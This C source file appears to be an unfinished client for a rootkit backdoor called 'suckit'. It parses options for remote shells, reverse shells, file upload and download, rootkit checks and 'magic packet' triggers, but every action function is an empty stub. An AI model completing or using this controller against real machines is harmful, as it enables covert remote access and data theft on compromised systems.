#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include "../include/actions.h"

int usage(char *s) {
    printf("Usage: %s -a {shell|rshell|down|up|check|listen} -h ip/hostname -l local_port -d dest_port [-f file] [-r]\n"
        "   -a: command to execute\n"
        "      * shell => launches a shell (-hd required)\n"
        "      * down => download a file (-hdf required)\n"
        "      * up => uploads a file (-hdf required)\n"
        "      * check => check if suckit is running on remote host (-hd required)\n"
        "      * listen => listens for a tty (-l required)\n"
		"   -r: launch the same command but in reverse mode (-l required)\n"
		"   -h: host or ip address\n"
		"   -l: local port to listen\n"
		"   -d: destination port to send magic\n"
        "   -f: file to upload or download\n"
        ,s);
	return -1;
}

// Client actions
int client_shell() {
	return 0;
}

int client_download() {
	return 0;
}

int client_upload() {
	return 0;
}

int client_check() {
	return 0;
}

int client_listen() {
	return 0;
}

int main(int argc, char *argv[]) {
	int opt, local_port = -1, dest_port = -1, action = -1, reverse = 0;
	char *host = 0, *cmd, *file = 0;

	// Read params
	while ((opt = getopt(argc, argv, "a:h:l:d:f:r") ) != EOF) {
        switch (opt) {
            case 'a':
                cmd = optarg;
                if (!strncmp(cmd, "shell", 5)) action = SHELL;
                else if (!strncmp(cmd, "down", 4)) action = DOWNLOAD;
                else if (!strncmp(cmd, "listen", 6)) action = LISTEN;
                else if (!strncmp(cmd, "up", 2)) action = UPLOAD;
                else if (!strncmp(cmd, "check", 5)) action = CHECK;
                break;
            case 'h':
				host = optarg;
				break;
            case 'l':
                if (sscanf(optarg, "%u\n", &local_port) != 1)
                    return usage(argv[0]);
                break;
            case 'd':
                if (sscanf(optarg, "%u\n", &dest_port) != 1)
                    return usage(argv[0]);
                break;
            case 'f':
                file=optarg;
                break;
			case 'r':
				reverse = 1;
				break;
            default:
                usage(argv[0]);
                return -1;
        }
    }

	// Check the parameters dependences
	if ((local_port > 65535) || (dest_port  > 65535) || (dest_port == -1) || 
		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
		((action == CHECK)    && ((!host) || (dest_port == -1))) ||
		((action == LISTEN)   && (local_port == -1)) || (action == -1) ||
		((reverse == 1) && (local_port == -1))) {
			return usage(argv[0]);
	}

	// Check hostname
	
	// Launch daemon if is a reverse command
	if ( reverse == 1) {
		// Launch daemon and wait

		// Launch magic packet with the command
	} else {
		// Launch magic packet with the command


	}

	return 0;
}
